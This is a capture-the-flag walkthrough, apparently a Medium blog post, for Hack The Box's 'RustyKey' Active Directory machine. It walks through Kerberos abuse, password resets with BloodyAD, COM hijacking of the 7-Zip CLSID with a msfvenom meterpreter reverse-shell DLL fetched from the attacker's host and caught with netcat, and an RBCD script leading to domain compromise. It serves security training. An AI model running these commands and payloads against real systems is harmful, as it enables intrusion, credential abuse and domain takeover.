Usually, Hack The Box doesn’t include this tip, but the **HelpDesk** group is one of the most common in Active Directory. If you focus on the screenshot above, you’ll see that all those users are part of the [**Protected Users** group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group), which means we **cannot create a TGT**. The main authentication protocol here is **Kerberos**, and without a TGT, I obviously can’t log in. So, I have to remove the user from this group which I will do via **BloodyAD**.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/RustyKey/bh_ce]  
└─# bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove -h  
usage: bloodyAD remove [-h] {dcsync,dnsRecord,genericAll,groupMember,object,rbcd,shadowCredentials,uac} ...  
  
options:  
-h, --help show this help message and exit  
  
remove commands:  
{dcsync,dnsRecord,genericAll,groupMember,object,rbcd,shadowCredentials,uac}  
dcsync Remove DCSync right for provided trustee  
dnsRecord Remove a DNS record of an AD environment.  
genericAll Remove full control of trustee on target  
groupMember Remove member (user, group, computer) from group  
object Remove object (user, group, computer, organizational unit, etc)  
rbcd Remove Resource Based Constraint Delegation for service on target  
shadowCredentials Remove Key Credentials from target  
uac Remove property flags altering user/computer object behavior
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/RustyKey/bh_ce]  
└─# faketime -f '+8h' bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 'IT'  
[-] IT removed from Protected Objects
```
Now I can **set the password**, **request a TGT**, and **log in via WinRM**.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/RustyKey/bh_ce]  
└─# faketime -f '+8h' bloodyAD -d rustykey.htb -k --host dc.rustykey.htb -u IT-COMPUTER3$ -p 'Rusty88!' set -h  
usage: bloodyAD set [-h] {object,owner,password} ...  
  
options:  
-h, --help show this help message and exit  
  
set commands:  
{object,owner,password}  
object Add/Replace/Delete target's attribute  
owner Changes target ownership with provided owner (WriteOwner permission required)  
password Change password of a user/computer
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/RustyKey/bh_ce]  
└─# faketime -f '+8h' bloodyAD -d rustykey.htb -k --host dc.rustykey.htb -u IT-COMPUTER3$ -p 'Rusty88!' set password bb.morgan 'Maverick##124'  
[+] Password changed successfully!
```
![](https://cdn-images-1.medium.com/max/800/1*xQEpqljWi0lLluKjlFTD3g.png)

*Credlogger #3*

Creating tgt with bb.morgan

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# faketime -f +8h impacket-getTGT RUSTYKEY.HTB/bb.morgan:'Maverick##124' -dc-ip dc.rustykey.htb  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Saving ticket in bb.morgan.ccache   
```

inject the ticket in our session so we can login

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# export KRB5CCNAME=bb.morgan.ccache  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# faketime -f '+8h' evil-winrm -r rustykey.htb -i dc.rustykey.htb  
  
Evil-WinRM shell v3.7  
  
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
  
Error: An error of type NoMethodError happened, message is undefined method `snakecase' for an instance of String  
  
Error: Exiting with code 1
```

But I faced this silly error even after placing the correct **krb5.conf** file. So, what should I do?

Of course, I watched[ **IppSec’s video**](https://youtu.be/vkbIVr4_ZdE?si=X9EMQK5U7oApea6n), and he mentioned the [**dwrm** ](https://github.com/1upbyte/Devious-WinRM)tool it’s alt for winrm . This was my first time seeing it and ironically, it didn’t work for IppSec in the video, but **it worked for me, LOL**.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# faketime -f '+8h' dwrm --username bb.morgan --password 'Maverick##124' --dc dc.rustykey.htb dc.rustykey.htb -k  
  
[+] Devious-WinRM v1.2.1 by 1upbyte  
[+] Using Kerberos!  
C:\Users\bb.morgan\Documents> ls  
  
  
Directory: C:\Users\bb.morgan\Documents  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
-a---- 11/11/2025 7:09 PM 51712 RunasCs.exe  
  
  
C:\Users\bb.morgan\Documents> cd ../desktop  
C:\Users\bb.morgan\desktop> cat user.txt  
9c8b4bcf8bc9----------------------  
C:\Users\bb.morgan\desktop>  
😈 Devious-WinRM | User: rustykey\bb.morgan     
```

![](https://cdn-images-1.medium.com/max/800/1*hwEpOkWeYNPqRFu5HRIGiw.png)

![](https://cdn-images-1.medium.com/max/800/0*S0tCTR4h22z6sX9y.gif)

*Here we go we got theuser flag!*

---

Now we’re **living off the land**, baby it’s time for **privilege escalation**!

You can run a ton of enumeration commands, or be a little smarter and use the [**PrivescCheck** ](https://github.com/itm4n/PrivescCheck)tool. Even then, you might not find anything… or maybe you’re a **ninja with LPE**, brother, LOL.

But here’s the key: on **BB.Morgan**’s desktop, you’ll find an interesting PDF called **internal.pdf**.

![](https://cdn-images-1.medium.com/max/800/0*5KE4GSpf0vw9v4tk.gif)

*Ninja hackers who have LPE (Local Privilege Escalation)*

If you try another user like EE.Reed, you’ll get an error. To solve that, you should use any Windows utility to log in as this user such as `runas`.

And there are the good people who implemented this Windows utility in C# and included it in Impacket (in another way). If you had RDP, for example, you could log in via other utilities like `winrs`, `psexec`, and many more lateral movement tools but `runas.cs` will get the job done here.

> Damn, there’s a common CVE-2025–60710 LPE from just three days ago, but the exploit got removed, LOL. That’s the price of staying updated, brother.

![](https://cdn-images-1.medium.com/max/800/0*5W30hlBHeC4gl2X9.gif)

*now no comment lol*

Back on track let’s see what’s inside the **internal.pdf**.

![](https://cdn-images-1.medium.com/max/800/1*hQUHoQnVfROwnPf2hK6Beg.png)

I think **that’s why** you can’t log in via **WinRM** as **EE.Reed** that’s exactly why I’ll use the **runas.cs** utility to open a session as the **EE.Reed** user.

Another important detail from the **internal.pdf** is that users in the **Support** group have **high privileges**. So now, we want to run as **EE.Reed** to explore what’s available to that user and within that group.

**dwrm** has the same upload and download functionality as **evil-winrm**, so I grab the **runas.cs** from [sharpCollection](https://github.com/Flangvik/SharpCollection). Now we want to set the password for the **EE.Reed** user and run **runas.cs**.

Now, after **setting a new password** and **removing the Support group user from the Protected Users group**, I run **runas.cs** with the password I created and open a listener as you can see in the screenshot.

![](https://cdn-images-1.medium.com/max/1200/1*A22-UqmwqTt1MJc_8DXkSw.png)

back again to the internal pdf

![](https://cdn-images-1.medium.com/max/800/1*qzoY-kOk9muKjRs8rA8AyA.png)

What is the meaning?? That means there is some manipulation at the registry level. The first thing I thought of is **COM hijacking** it’s an advanced topic to explain, but I’ll give you a nearby example: **unquoted service paths**. That might work in a similar way to exploit it, but this one is in the registry path.

Okay, we will create a **malicious DLL**, put it in that registry path, run it, and set up a listener. That’s the way and we will get the **MM.Turner** user.

But first, I want to explain some things related to **COM**: what it is, and so on.

---

### 1. What is COM?

**COM = Component Object Model**, an ancient but powerful Windows technology.

Think of COM like this:

- Windows loads small “components” (DLLs) that provide features
- These features can be Explorer extensions, context menu entries, UI helpers, shell extensions, etc.
- Each component has an **ID (CLSID)**
- Windows uses the **Registry** to know **which DLL** belongs to which component

Example:

- Right-click a file → Explorer loads all COM DLLs registered as **ContextMenuHandlers**
- **7-Zip** has a COM entry that adds the “Extract here” menu
- That COM entry → points to a **CLSID** → that CLSID maps to a **DLL path**

If Windows calls that COM component → it loads that DLL → it executes its code.

This is where the exploit happens.

---

### 2. What is a CLSID?

A **CLSID** = a 128-bit GUID that identifies a COM object.

Example from Our writeup:

```powershell
C:\Users\bb.morgan\Documents> Get-ItemProperty -Path  
"HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}"  
Missing an argument for parameter 'Path'. Specify a parameter of type 'System.String[]' and try again.  
HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}  
C:\Users\bb.morgan\Documents>
```

```powershell
{23170F69-40C1-278A-1000-000100020000}
```
This CLSID maps to:

```powershell
HKCR\CLSID\{GUID}\InProcServer32
```

And inside `InProcServer32` you find the path of the DLL Windows will load.

```powershell
PS C:\programdata> (Get-ItemProperty "Registry::HKCR\Directory\shellex\ContextMenuHandlers\7-Zip").'(default)'  
(Get-ItemProperty "Registry::HKCR\Directory\shellex\ContextMenuHandlers\7-Zip").'(default)'  
{23170F69-40C1-278A-1000-000100020000}  
PS C:\programdata> Get-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32"  
Get-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32"  
  
  
(default) : C:\Program Files\7-Zip\7-zip.dll  
ThreadingModel : Apartment  
PSPath : Microsoft.PowerShell.Core\Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32  
PSParentPath : Microsoft.PowerShell.Core\Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}  
PSChildName : InProcServer32  
PSProvider : Microsoft.PowerShell.Core\Registry  
  
  
  
PS C:\programdata> Get-Acl "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32" | fl  
Get-Acl "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32" | fl  
  
  
Path : Microsoft.PowerShell.Core\Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32  
Owner : BUILTIN\Administrators  
Group : RUSTYKEY\Domain Users  
Access : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow ReadKey  
BUILTIN\Administrators Allow FullControl  
CREATOR OWNER Allow FullControl  
RUSTYKEY\Support Allow FullControl  
NT AUTHORITY\SYSTEM Allow FullControl  
BUILTIN\Administrators Allow FullControl  
BUILTIN\Users Allow ReadKey  
Audit :  
Sddl : O:BAG:DUD:AI(A;CIID;KR;;;AC)(A;ID;KA;;;BA)(A;CIIOID;KA;;;CO)(A;CIID;KA;;;S-1-5-21-3316070415-896458127-4139322  
052-1132)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;BA)(A;CIID;KR;;;BU)  
  
  
  
PS C:\programdata>
```

---

### 3. What is a Context Menu Handler?

When you right-click in Windows Explorer, Windows loads “Context Menu Handler” COM DLLs to create menu entries.

7-Zip registers itself here:

![](https://cdn-images-1.medium.com/max/800/1*Y-YWJxMT9VGkmh3NQOFEgA.png)

```powershell
HKCR\*\shellex\ContextMenuHandlers\7-Zip  
HKCR\Directory\shellex\ContextMenuHandlers\7-Zip  
HKCR\Folder\shellex\ContextMenuHandlers\7-Zip
```

These keys point to the **CLSID**.

So the flow is:

Right-click → Windows looks in registry → finds ContextMenuHandlers → finds CLSID → loads the DLL → DLL executes code.

If you can modify the **DLL path**, you hijack execution.

---

### 4. What is COM Hijacking?

**COM Hijacking** = replacing the legitimate DLL path in a CLSID with your malicious DLL.

So, I created a DLL using **msfvenom**, uploaded it, and triggered it as shown

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.41 LPORT=4445 -f dll -o mavboy.dll  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
[-] No arch selected, selecting arch: x64 from the payload  
No encoder specified, outputting raw payload  
Payload size: 510 bytes  
Final size of dll file: 9216 bytes  
Saved as: mavboy.dll
```

```bash
Set-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32" -Name "(default)" -Value "C:\programdata\mavboy.dll"
```

```powershell
PS C:\programdata> Set-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32" -Name "(default)" -Value "C:\programdata\mavboy.dll"  
Set-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32" -Name "(default)" -Value "C:\programdata\mavboy.dll"  
PS C:\programdata> Get-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32"  
Get-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32"  
  
  
(default)      : C:\Program Files\7-Zip\7-zip.dll  
ThreadingModel : Apartment  
PSPath         : Microsoft.PowerShell.Core\Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32  
PSParentPath   : Microsoft.PowerShell.Core\Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}  
PSChildName    : InProcServer32  
PSProvider     : Microsoft.PowerShell.Core\Registry  
  
  
  
PS C:\programdata>
```

```powershell
PS C:\programdata> iwr -uri http://10.10.16.41:1337/mavboy.dll -outfile mavboy.dll  
  
iwr -uri http://10.10.16.41:1337/mavboy.dll -outfile mavboy.dll  
PS C:\programdata>  
PS C:\programdata> ls  
ls  
  
  
Directory: C:\programdata  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
d---s- 12/26/2024 4:21 PM Microsoft  
d----- 7/24/2025 1:08 AM Package Cache  
d----- 6/24/2025 11:53 AM regid.1991-06.com.microsoft  
d----- 9/15/2018 12:19 AM SoftwareDistribution  
d----- 11/5/2022 12:03 PM ssh  
d----- 9/15/2018 12:19 AM USOPrivate  
d----- 11/5/2022 12:03 PM USOShared  
d----- 12/26/2024 4:28 PM VMware  
-a---- 11/12/2025 1:49 AM 9216 mavboy.dll  
-a---- 11/11/2025 10:24 PM 51712 RunasCs.exe  
  
  
PS C:\programdata>
```
And set up the listener on port **4445**:

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# rlwrap -cAr nc -lnvp 4445  
Listening on 0.0.0.0 4445  
Connection received on 10.10.11.75 51291  
Microsoft Windows [Version 10.0.17763.7434]  
(c) 2018 Microsoft Corporation. All rights reserved.  
  
C:\Windows>whoami  
rustykey\mm.turner
```

Now anytime the COM object is triggered (ex: right-click), Windows loads **your** DLL instead of the real one → code execution!

This works because:

- Explorer runs as the logged-in user
- The context menu handler is auto-loaded
- Your DLL is executed in-process

> Perfect for persistence or privilege escalation if the DLL is loaded in a high-integrity process.

---

Now we are **MM.Turner** I’ll mark it as **owned** in BloodHound and see what I can do next.

![](https://cdn-images-1.medium.com/max/1200/1*WV-8MvVYP-4du79pYt51UQ.png)

As you can see, **MM.Turner** is a member of the **DelegationManager** group, which has **AddAllowedToAct** permissions over the **DC**. This means we can perform **Resource-Based Constrained Delegation (RBCD)** and impersonate the **Administrator** user, who is a member of the **Domain Admins (DA)** group.

But there’s a problem: **Administrator** is a **sensitive user**, which means we **can’t perform RBCD** with that account. You can verify this during initial enumeration using the **ActiveDirectory module**, as I’ll show you.

```powershell
PS C:\Users\mm.turner> Import-Module ActiveDirectory  
  
PS C:\Users\mm.turner> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount  
  
DistinguishedName : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb  
DNSHostName : dc.rustykey.htb  
Enabled : True  
Name : DC  
ObjectClass : computer  
ObjectGUID : dee94947-219e-4b13-9d41-543a4085431c  
PrincipalsAllowedToDelegateToAccount : {}  
SamAccountName : DC$  
SID : S-1-5-21-3316070415-896458127-4139322052-1000  
UserPrincipalName :  
  
  
PS C:\Users\mm.turner> Get-ADUser Administrator -Properties AccountNotDelegated  
  
AccountNotDelegated : True  
DistinguishedName : CN=Administrator,CN=Users,DC=rustykey,DC=htb  
Enabled : True  
GivenName :  
Name : Administrator  
ObjectClass : user  
ObjectGUID : b8ed1fa0-613e-4937-b5fb-3ae9978c9ffc  
SamAccountName : Administrator  
SID : S-1-5-21-3316070415-896458127-4139322052-500  
Surname :  
UserPrincipalName :
```

![](https://cdn-images-1.medium.com/max/800/1*ScjEFHzwXrYB5hbY4F34zQ.png)

So, my choice for the account now goes to BackupAdmin, as it’s the only inbound user to the Administrator account. He is also part of Enterprise Admins, which means high privilege and priority in pentesting to me. Plus, he is not a sensitive user in BloodHound so how to enumerate that too using the AD module?

```powershell
PS C:\Users\mm.turner> Get-ADUser backupAdmin -Properties AccountNotDelegated  
  
AccountNotDelegated : False  
DistinguishedName : CN=backupadmin,CN=Users,DC=rustykey,DC=htb  
Enabled : True  
GivenName : backupadmin  
Name : backupadmin  
ObjectClass : user  
ObjectGUID : adea093f-5ec8-4ac7-9da3-196a1b1fa37d  
SamAccountName : backupadmin  
SID : S-1-5-21-3316070415-896458127-4139322052-3601  
Surname :  
UserPrincipalName : backupadmin@rustykey.htb
```

```powershell
# Or for full details  
Get-ADUser -Identity "BackupAdmin" -Properties * | Select Name, CannotBeDelegated, MemberOf
```

You can automate [Resource-Based Constrained Delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) (RBCD) using impacket-rbcd with the `IT-COMPUTER3$` machine account but since I already used that on the [Intercept machine](https://infosecwriteups.com/intercept-vulnlab-rbcd-another-word-for-esc7-4fbd254b6006), I’ll stick with the ActiveDirectory module here (which is also a priority in pentesting).

```powershell
# Example: Grant RBCD using AD module (run from compromised host with sufficient rights)  
Import-Module ActiveDirectory  
  
# Allow IT-COMPUTER3$ to delegate to BackupAdmin  
Set-ADObject -Identity "CN=BackupAdmin,CN=Users,DC=rustykey,DC=local" `  
-Add @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = "CN=IT-COMPUTER3$,CN=Computers,DC=rustykey,DC=local"}  
  
# Verify  
Get-ADObject -Identity "CN=BackupAdmin,CN=Users,DC=rustykey,DC=local" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

```powershell
PS C:\Users\mm.turner> $existing = (Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount).PrincipalsAllowedToDelegateToAccount  
PS C:\Users\mm.turner> $new = "IT-Computer3$"  
PS C:\Users\mm.turner> if ($existing) {  
>> $updated = $existing + (Get-ADComputer $new).DistinguishedName  
>> } else {  
>> $updated = (Get-ADComputer $new).DistinguishedName  
>> }  
>>  
PS C:\Users\mm.turner> Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount $updated  
  
PS C:\Users\mm.turner> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount  
  
DistinguishedName : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb  
DNSHostName : dc.rustykey.htb  
Enabled : True  
Name : DC  
ObjectClass : computer  
ObjectGUID : dee94947-219e-4b13-9d41-543a4085431c  
PrincipalsAllowedToDelegateToAccount : {CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb}  
SamAccountName : DC$  
SID : S-1-5-21-3316070415-896458127-4139322052-1000  
UserPrincipalName :  
  
  
PS C:\Users\mm.turner>
```

Automated script for RBCD Enumeration

```powershell
# ===============================================  
# Automated RBCD Setup Script (PowerShell + AD Module)  
# Author: Mohamed Eletreby (Maverick)  
# Purpose: Enable IT-COMPUTER3$ to impersonate high-priv users via RBCD  
# ===============================================  
  
Import-Module ActiveDirectory  
  
# === Configuration ===  
$TargetComputer = "DC" # Target to delegate TO (e.g., DC, FileServer)  
$DelegateFrom = "IT-COMPUTER3" # Machine account that will impersonate  
$UsersToCheck = @("Administrator", "BackupAdmin")  
  
Write-Host "[*] Starting RBCD Automation..." -ForegroundColor Cyan  
  
# === Step 1: Show current delegation on target computer ===  
Write-Host "`n[+] Current delegation on $TargetComputer`:" -ForegroundColor Yellow  
Get-ADComputer -Identity $TargetComputer -Properties PrincipalsAllowedToDelegateToAccount, DistinguishedName |  
Select-Object Name, DNSHostName, Enabled, @{Name="Delegates"; Expression={$_.PrincipalsAllowedToDelegateToAccount}} |  
Format-List  
  
# === Step 2: Check if users are sensitive (cannot be delegated) ===  
Write-Host "`n[+] Checking delegation status for users..." -ForegroundColor Yellow  
foreach ($user in $UsersToCheck) {  
try {  
$u = Get-ADUser -Identity $user -Properties AccountNotDelegated -ErrorAction Stop  
$status = if ($u.AccountNotDelegated) { "SENSITIVE (Cannot Delegate)" } else { "OK (Can Delegate)" }  
Write-Host " - $user : $status" -ForegroundColor $(if ($u.AccountNotDelegated) { "Red" } else { "Green" })  
} catch {  
Write-Warning " - $user : Not found or error"  
}  
}  
  
# === Step 3: Get machine object DN ===  
try {  
$delegateObj = Get-ADComputer -Identity $DelegateFrom -Properties DistinguishedName -ErrorAction Stop  
$delegateDN = $delegateObj.DistinguishedName  
Write-Host "`n[+] Delegate Machine DN: $delegateDN" -ForegroundColor Green  
} catch {  
Write-Error "Failed to resolve $DelegateFrom. Is it a valid computer object?"  
exit 1  
}  
  
# === Step 4: Apply RBCD (Add machine to AllowedToActOnBehalfOf) ===  
$targetObj = Get-ADComputer -Identity $TargetComputer -Properties PrincipalsAllowedToDelegateToAccount  
  
$existing = @()  
if ($targetObj.PrincipalsAllowedToDelegateToAccount) {  
$existing = $targetObj.PrincipalsAllowedToDelegateToAccount  
}  
  
if ($existing -contains $delegateDN) {  
Write-Host "`n[!] $DelegateFrom is already allowed to delegate to $TargetComputer" -ForegroundColor Yellow  
} else {  
$updated = $existing + $delegateDN  
try {  
Set-ADComputer -Identity $TargetComputer -PrincipalsAllowedToDelegateToAccount $updated  
Write-Host "`n[+] SUCCESS: RBCD applied! $DelegateFrom can now impersonate users on $TargetComputer" -ForegroundColor Green  
} catch {  
Write-Error "Failed to set RBCD: $($_.Exception.Message)"  
exit 1  
}  
}  
  
# === Step 5: Final Verification ===  
Write-Host "`n[+] Final delegation state on $TargetComputer`:" -ForegroundColor Yellow  
Get-ADComputer -Identity $TargetComputer -Properties PrincipalsAllowedToDelegateToAccount |  
Select-Object Name, @{Name="AllowedToAct"; Expression={($_.PrincipalsAllowedToDelegateToAccount).DistinguishedName -join "; "}} |  
Format-List  
  
Write-Host "`n[+] RBCD Setup Complete! Use getST.py to request ticket as BackupAdmin." -ForegroundColor Cyan  
Write-Host " Example:" -ForegroundColor Gray  
Write-Host " getST.py -spn 'cifs/dc.rustykey.local' 'rustykey.local/IT-COMPUTER3$' -impersonate BackupAdmin" -ForegroundColor Gray
```

It’s time to create a service ticket with Impacket for the ***CIFS ***service, then access BackupAdmin privileges with any lateral movement tools like PSExec (and so on) after injecting the ticket into our session.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# faketime -f '+8h' impacket-getST 'rustykey.htb/IT-COMPUTER3$:Rusty88!' -k -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies  
  
[-] CCache file is not found. Skipping...  
[*] Getting TGT for user  
[*] Impersonating backupadmin  
[*] Requesting S4U2self  
[*] Requesting S4U2Proxy  
[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/RustyKey]  
└─# faketime -f '+8h' impacket-wmiexec -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb'  
  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] SMBv3.0 dialect used  
[!] Launching semi-interactive shell - Careful what you execute  
[!] Press help for extra shell commands  
C:\>whoami  
rustykey\backupadmin  
  
C:\>cd users  
C:\users>dir  
Volume in drive C has no label.  
Volume Serial Number is 00BA-0DBE  
  
Directory of C:\users  
  
06/24/2025 08:14 AM <DIR> .  
06/24/2025 08:14 AM <DIR> ..  
06/04/2025 08:37 AM <DIR> Administrator  
12/30/2024 08:53 PM <DIR> bb.morgan  
12/31/2024 01:19 PM <DIR> mm.turner  
12/26/2024 04:22 PM <DIR> Public  
0 File(s) 0 bytes  
6 Dir(s) 3,534,733,312 bytes free  
  
C:\users>cd Administrator  
C:\users\Administrator>dir  
Volume in drive C has no label.  
Volume Serial Number is 00BA-0DBE  
  
Directory of C:\users\Administrator  
  
06/04/2025 08:37 AM <DIR> .  
06/04/2025 08:37 AM <DIR> ..  
06/24/2025 09:00 AM <DIR> 3D Objects  
06/24/2025 09:00 AM <DIR> Contacts  
06/24/2025 09:00 AM <DIR> Desktop  
06/24/2025 09:00 AM <DIR> Documents  
06/24/2025 09:00 AM <DIR> Downloads  
06/24/2025 09:00 AM <DIR> Favorites  
06/24/2025 09:00 AM <DIR> Links  
06/24/2025 09:00 AM <DIR> Music  
06/24/2025 09:00 AM <DIR> Pictures  
06/24/2025 09:00 AM <DIR> Saved Games  
06/24/2025 09:00 AM <DIR> Searches  
06/24/2025 09:00 AM <DIR> Videos  
0 File(s) 0 bytes  
14 Dir(s) 3,534,491,648 bytes free  
  
C:\users\Administrator>cd Desktop  
C:\users\Administrator\Desktop>dir  
Volume in drive C has no label.  
Volume Serial Number is 00BA-0DBE  
  
Directory of C:\users\Administrator\Desktop  
  
06/24/2025 09:00 AM <DIR> .  
06/24/2025 09:00 AM <DIR> ..  
11/13/2025 04:02 AM 34 root.txt  
1 File(s) 34 bytes  
2 Dir(s) 3,534,495,744 bytes free  
  
C:\users\Administrator\Desktop>type root.txt  
7c296f7255b604d1------------  
  
C:\users\Administrator\Desktop>
```

Unfortunately, the machine isn’t stable enough. I intended to show you **more RBCD scenarios** on this box maybe in the near future. I’ll demonstrate **additional RBCD techniques** when it’s ready. The **AD scenarios** on this machine are **on fire**, but I faced **a lot of bugs**. I hope it becomes **stable soon** so I can come back and explore **more RBCD paths**.

I hope I explained everything **clearly** for you. **Happy hacking!**

---

<div class="video-embed"><iframe src="https://www.youtube.com/embed/yjp7k81x5KU" title="YouTube video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe></div>

**This writeup was made with ❤️ by Mohamed Eletreby (aka Maverick)** *Checkmate, bro!* ♟️

---

### Wanna Keep in Touch with Maverick?

![](https://cdn-images-1.medium.com/max/800/0*HbeenuSiiET6m37F.gif)

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking!

By Mohamed Eletreby on November 15, 2025.

Canonical link

Exported from Medium on April 20, 2026.